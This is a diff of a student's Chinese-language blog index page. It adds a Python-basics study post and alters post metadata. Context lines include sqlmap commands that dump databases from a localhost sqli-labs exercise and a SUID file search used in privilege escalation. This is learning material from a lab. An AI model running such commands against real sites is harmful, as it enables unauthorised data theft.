@@ -127,13 +127,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -176,6 +176,166 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/28/python%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/10/28/python%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">python学习</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-10-28 17:25:38" itemprop="dateCreated datePublished" datetime="2021-10-28T17:25:38+08:00">2021-10-28</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-10-30 00:05:10" itemprop="dateModified" datetime="2021-10-30T00:05:10+08:00">2021-10-30</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h1><p>python中，一切皆为对象。每个对象由：标识(identity),类型(type),值(value)组成。</p>
+<ol>
+<li>标识用于唯一标识对象，通常对应对象在计算机内存中的地址。使用内置函数id(obj)课返回对象obj的标识。</li>
+<li>类型用于表示对象存储的“数据”的类型。类型可以限制对象的取值范围以及可执行的操作。可以使用type(obj)获取对象的所属类型。</li>
+<li>值表示对象所存储的信息。使用print(obj)可以直接打印出值。</li>
+</ol>
+<h2 id="对象的本质就是：一个内存块，拥有特定值，支持特定类型的相关操作。"><a href="#对象的本质就是：一个内存块，拥有特定值，支持特定类型的相关操作。" class="headerlink" title="对象的本质就是：一个内存块，拥有特定值，支持特定类型的相关操作。"></a><strong>对象的本质就是：一个内存块，拥有特定值，支持特定类型的相关操作。</strong></h2><p><img src="https://i.loli.net/2021/10/29/nfyi6woT7tdk1OE.jpg" alt="Screenshot_20211029_095052_tv.danmaku.bili_edit_384246334166280.jpg"></p>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>在python中，变量也变成：对象的引用。因为，变量存储的就是对象的地址。变量通过地址引用了“对象”。</p>
+<p>变量位于：栈内存</p>
+<p>对象位于：堆内存</p>
+<h2 id="python-是动态类型语言"><a href="#python-是动态类型语言" class="headerlink" title="python 是动态类型语言"></a>python 是动态类型语言</h2><p>变量不需要显式类型。根据变量引用对象，python解释器自动确定数据类型。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="python-是强类型语言"><a href="#python-是强类型语言" class="headerlink" title="python 是强类型语言"></a>python 是强类型语言</h2><p>每个对象都有数据类型，只支持该类型支持的操作。</p>
+<h1 id="变量的声明和赋值"><a href="#变量的声明和赋值" class="headerlink" title="变量的声明和赋值"></a>变量的声明和赋值</h1><p>变量的声明和赋值用于将一个变量绑定到一个对象身上，格式如下：</p>
+<p>变量名=表达式</p>
+<p>最简单的表达式是字面量。比如：a=123。运行过程中，解释器先运行右边的表达式，生成一个代表表达式运算的结果的对象：然后，将这个对象地址赋值给左边的变量。 </p>
+<h1 id="删除变量和垃圾回收机制"><a href="#删除变量和垃圾回收机制" class="headerlink" title="删除变量和垃圾回收机制"></a>删除变量和垃圾回收机制</h1><p>可以通过del语句删除不在使用的变量。如果对象没有变量应用，就会被回收器回收，清空内存空间。(自动回收)</p>
+<p><img src="https://i.loli.net/2021/10/29/pG53Y6WohDCKwbq.jpg" alt="Screenshot_20211029_193403_tv.danmaku.bili_edit_384119715821328.jpg"></p>
+<h1 id="基本内置数据类型介绍（和C-C-没区别）"><a href="#基本内置数据类型介绍（和C-C-没区别）" class="headerlink" title="基本内置数据类型介绍（和C/C++没区别）"></a>基本内置数据类型介绍（和C/C++没区别）</h1><h2 id="整型（int）"><a href="#整型（int）" class="headerlink" title="整型（int）"></a>整型（int）</h2><p>整数，2345，python2中整数是32位    -2^63^—2^63^-1之间的数,python3中int可以存储任意大小的数，long被取消。python3中可以做超大数的计算，而不会造成数据溢出。</p>
+<h2 id="浮点型（float）"><a href="#浮点型（float）" class="headerlink" title="浮点型（float）"></a>浮点型（float）</h2><p>小数，314*e-2，浮点数在内存中也是按照科学计数法来存储的。</p>
+<h2 id="布尔型（bool）"><a href="#布尔型（bool）" class="headerlink" title="布尔型（bool）"></a>布尔型（bool）</h2><p>表示真假，仅包含true，false，python2中没有bool值，直接用0,1表示，python3中true和false被定义成了关键字，但他们的本质还是0和1，甚至可以和数字相加。</p>
+<img src="https://i.loli.net/2021/10/29/rNcEseDIGWid1Zv.png" alt="QQ截图20211029232434_1_.png" style="zoom:200%;" />
+
+<h2 id="字符串型（string）"><a href="#字符串型（string）" class="headerlink" title="字符串型（string）"></a>字符串型（string）</h2><p>由字符组成的序列</p>
+<p>python不支持单字符类型，单字符也是作为一个字符串使用的。</p>
+<p>python的字符串是不变的，我们无法对任意的原字符进行任意修改。但，可以将字符串的一部分复制到新创建的字符串当中，达到“看起来修改”的效果。</p>
+<h3 id="字符串的编码"><a href="#字符串的编码" class="headerlink" title="字符串的编码"></a>字符串的编码</h3><p>python3直接支持unicode，可以表示世界上的任何书面语言的字符。python3的字符默认就是16位unicode编码，ascii码是unicode编码的子集。</p>
+<p>使用内置函数ord()可以把字符转换成对应的unicode码；</p>
+<p>使用内置函数chr()可以把十进制数转换成对应的字符。</p>
+<img src="https://i.loli.net/2021/10/29/8RjPFz9iNJKVHso.png" alt="QQ截图20211029235713_1_.png" style="zoom:200%;" />
+
+
+
+<h2 id="引号创建字符串"><a href="#引号创建字符串" class="headerlink" title="引号创建字符串"></a>引号创建字符串</h2><p>可以通过单引号或双引号创建字符串。如：a=’abc’;b=’sxt’</p>
+<p>使用两种引号的好处是可以创建本身就包含的引号的字符串，而不使用转义字符。如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=<span class="string">&quot;I&#x27;m a teacher!&quot;</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> (a)</span><br><span class="line">&gt;&gt;&gt;b=<span class="string">&#x27;my_name is &quot;tom&quot;&#x27;</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> (b)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="链式赋值"><a href="#链式赋值" class="headerlink" title="链式赋值"></a>链式赋值</h2><p>链式赋值用于同一个对象赋值给多个变量。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=y=z //相当于：x=<span class="number">123</span>,y=<span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="系列解包式赋值"><a href="#系列解包式赋值" class="headerlink" title="系列解包式赋值"></a>系列解包式赋值</h2><p>系列数据赋值给对应相同个数的变量（个数必须保持一致）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b,c=<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> //相当于：a=<span class="number">4</span>;b=<span class="number">5</span>;c=<span class="number">6</span></span><br></pre></td></tr></table></figure>
+
+<p>操作使用系列解包赋值实现变量交换</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b=<span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b=b,a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a,b)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2021/10/29/2p5A4l3mwij1doR.png" alt="QQ截图20211029195620.png"></p>
+<p>这里对比C语言数值交换，不用多定义一个变量。</p>
+<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><img src="https://i.loli.net/2021/10/29/OcVuU96jv84E2QH.png" alt="Screenshot_20211029_200514_tv.danmaku.bili.png"></p>
+<h2 id="类型转化和四舍五入"><a href="#类型转化和四舍五入" class="headerlink" title="类型转化和四舍五入"></a>类型转化和四舍五入</h2><ol>
+<li>类似于int(),可以使用float()将其他类型转化成浮点数。</li>
+<li>整数和浮点数混合运算时，表达式结果自动转型为浮点数。</li>
+<li>round()可以返回四舍五入的值。</li>
+</ol>
+<p>注：但是不会改变原有值，而是会产生新的值</p>
+<h2 id="增强型赋值运算符"><a href="#增强型赋值运算符" class="headerlink" title="增强型赋值运算符"></a>增强型赋值运算符</h2><p>运算符+，-，*，/，**和%和赋值符都可以构成“增强型赋值运算符”。</p>
+<p>a=a+1 等价于 a+=1</p>
+<p><img src="https://i.loli.net/2021/10/29/iqxbF1VHQophRgf.png" alt="Screenshot_20211029_203239_tv.danmaku.bili.png"></p>
+<h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p><img src="https://i.loli.net/2021/10/29/uQAqxiZ58ajXLJv.png" alt="Screenshot_20211029_232906_tv.danmaku.bili.png"></p>
+<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p><img src="https://i.loli.net/2021/10/29/Ewh47uQTPF3DKOX.png" alt="Screenshot_20211029_233137_tv.danmaku.bili.png"></p>
+<h2 id="同一运算符"><a href="#同一运算符" class="headerlink" title="同一运算符"></a>同一运算符</h2><p><img src="https://i.loli.net/2021/10/29/sNFEwmDJfMC6akZ.png" alt="Screenshot_20211029_233336_tv.danmaku.bili.png"></p>
+<p>is与==区别：</p>
+<p>is用于判断两个变量引用对象是否为同一个，既对象的地址。</p>
+<p>==用于判断引用变量对象的值是否相等，默认调用对象的—eq—()方法</p>
+<p>ps：整数缓存问题：</p>
+<p>python 仅仅对比较小的整数进行缓存（范围为[-5,256]），而并非是所有的整数对象。需要注意的是，这仅仅是在 命令行中执行，而在pycham或者保存为文件执行，结果是不一样的，这是因为解释器做了一部分优化（范围[-5,任何正整数]）。</p>
+<h1 id="时间的表示"><a href="#时间的表示" class="headerlink" title="时间的表示"></a>时间的表示</h1><p>计算机中时间的表示是从“1970年1月1日 00:00:00”开始的，以毫秒（1/1000秒）进行计算的。我们也把1970年这个时刻记为“unix时间点”。</p>
+<p>这样，我们就把时间全部用数字表示了。</p>
+<p><img src="https://i.loli.net/2021/10/29/7xdYnAcwfOSB4D2.png" alt="Screenshot_20211029_203817_tv.danmaku.bili.png"></p>
+<p>python 中可以通过time.time()获取当前时刻，返回的值是以秒为单位，带微秒(1/1000毫秒)精度的浮点数。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/27/less5,6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -189,7 +349,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/10/27/less5,6/" class="post-title-link" itemprop="url">lesson5~10总结</a>
+          <a href="/2021/10/27/less5,6/" class="post-title-link" itemprop="url">lesson5，6总结</a>
         </h2>
 
         <div class="post-meta-container">
@@ -199,9 +359,24 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2021-10-27 12:19:09 / Modified: 19:25:41" itemprop="dateCreated datePublished" datetime="2021-10-27T12:19:09+08:00">2021-10-27</time>
+      <time title="Created: 2021-10-27 12:19:09" itemprop="dateCreated datePublished" datetime="2021-10-27T12:19:09+08:00">2021-10-27</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-10-28 17:27:34" itemprop="dateModified" datetime="2021-10-28T17:27:34+08:00">2021-10-28</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
     </span>
 
   
@@ -262,7 +437,7 @@
 <p>这样省了我们改字母的时间但是无法明确的给出库名还是得一个一试然后拼凑在一起。</p>
 <p>那么还有更简便的方法吗？有</p>
 <hr>
-<h1 id="sqlmap应用"><a href="#sqlmap应用" class="headerlink" title="sqlmap应用"></a>sqlmap应用</h1><p>直接cmd-&gt;py sqlmap.py  -u ‘<a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=&#39;">http://localhost/Less-5/?id=&#39;</a> –dbs  爆库</p>
+<h1 id="sqlmap应用"><a href="#sqlmap应用" class="headerlink" title="sqlmap应用"></a>sqlmap应用</h1><h2 id="哈哈！时代变啦！"><a href="#哈哈！时代变啦！" class="headerlink" title="哈哈！时代变啦！"></a>哈哈！时代变啦！</h2><p>直接cmd-&gt;py sqlmap.py  -u ‘<a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=&#39;">http://localhost/Less-5/?id=&#39;</a> –dbs  爆库</p>
 <p>py  sqlmap.py -u ‘<a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” –tables 爆表</p>
 <p>py sqlmap.py -u ‘<a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” -T”表名” –columns 爆字段</p>
 <p>py sqlmap.py -u ‘<a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” -T”表名” -C”字段名” –dump  打包丢出</p>
@@ -747,8 +922,17 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-10-06 16:21:51" itemprop="dateModified" datetime="2021-10-06T16:21:51+08:00">2021-10-06</time>
+        <time title="Modified: 2021-10-27 19:41:15" itemprop="dateModified" datetime="2021-10-27T19:41:15+08:00">2021-10-27</time>
       </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%B8%B8%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">常识</span></a>
+        </span>
+    </span>
 
   
 </div>
@@ -836,10 +1020,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2021-10-01 09:28:04 / Modified: 09:27:15" itemprop="dateCreated datePublished" datetime="2021-10-01T09:28:04+08:00">2021-10-01</time>
+      <time title="Created: 2021-10-01 09:28:04" itemprop="dateCreated datePublished" datetime="2021-10-01T09:28:04+08:00">2021-10-01</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-10-27 19:40:34" itemprop="dateModified" datetime="2021-10-27T19:40:34+08:00">2021-10-27</time>
+      </span>
 
   
 </div>
@@ -1154,76 +1344,6 @@
 <h3 id="查找具有权限root的文件"><a href="#查找具有权限root的文件" class="headerlink" title="查找具有权限root的文件"></a>查找具有权限root的文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span> / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 <hr>
 
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/18/The-First-Day/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/09/18/The-First-Day/" class="post-title-link" itemprop="url">The First Day</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-09-18 19:12:09" itemprop="dateCreated datePublished" datetime="2021-09-18T19:12:09+08:00">2021-09-18</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-09-26 09:57:18" itemprop="dateModified" datetime="2021-09-26T09:57:18+08:00">2021-09-26</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="今天是加入牛X发福队的第一，一切都是这么的亲切可爱，在亲爱的学长的热情指导下，我学会了编辑我的第一篇博客，感觉未来一片光明呢！好的。"><a href="#今天是加入牛X发福队的第一，一切都是这么的亲切可爱，在亲爱的学长的热情指导下，我学会了编辑我的第一篇博客，感觉未来一片光明呢！好的。" class="headerlink" title="今天是加入牛X发福队的第一，一切都是这么的亲切可爱，在亲爱的学长的热情指导下，我学会了编辑我的第一篇博客，感觉未来一片光明呢！好的。"></a>今天是加入牛X发福队的第一，一切都是这么的亲切可爱，在亲爱的学长的热情指导下，我学会了编辑我的第一篇博客，感觉未来一片光明呢！好的。</h2>
       
     </div>
 
